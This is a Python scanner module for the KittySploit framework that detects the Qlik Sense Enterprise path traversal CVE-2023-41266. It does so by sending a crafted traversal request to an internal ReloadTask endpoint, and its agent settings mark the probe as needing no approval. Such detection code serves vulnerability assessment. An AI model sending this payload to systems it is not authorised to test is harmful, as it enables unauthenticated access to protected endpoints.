#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""A path traversal vulnerability found in Qlik Sense Enterprise for Windows for versions May 2023 Patch 3 and ea."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Qlik Sense Enterprise - Path Traversal Detection',
        'description': 'A path traversal vulnerability found in Qlik Sense Enterprise for Windows for versions May 2023 Patch 3 and earlier, February 2023 Patch 7 and earlier, November 2022 Patch 10 and earlier, and August 2022 Patch 12 and earlier allows an unauthenticated remote attacker to generate an anonymous session. This allows them to transmit HTTP requests to unauthorized endpoints. This is fixed in August 2023 IR, May 2023 Patch 4, February 2023 Patch 8, November 2022 Patch 11, and August 2022 Patch 13.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2023', 'qlik', 'traversal', 'kev', 'windows', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://community.qlik.com/t5/Official-Support-Articles/Critical-Security-fixes-for-Qlik-Sense-Enterprise-for-Windows/ta-p/2110801',
            'https://www.praetorian.com/blog/advisory-qlik-sense/',
            'https://www.praetorian.com/blog/qlik-sense-technical-exploit',
            'https://community.qlik.com/t5/Release-Notes/tkb-p/ReleaseNotes',
            'https://github.com/Ostorlab/KEV',
        ],
        'cve': 'CVE-2023-41266',
    }

    def run(self):
        r = self.http_request(method="GET", path='/resources/qmc/fonts/../../../qrs/ReloadTask?xrfkey=1333333333333337&filter=.ttf', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = (r.text or "").lower()
        body_any = ('x-qlik-session', 'the comparison expression does not consist of three elements',)
        if (any(m in body for m in body_any)):
            self.set_info(
                severity='medium',
                reason="Qlik Sense Enterprise - Path Traversal detected",
                path='/resources/qmc/fonts/../../../qrs/ReloadTask?xrfkey=1333333333333337&filter=.ttf',
            )
            return True
        return False

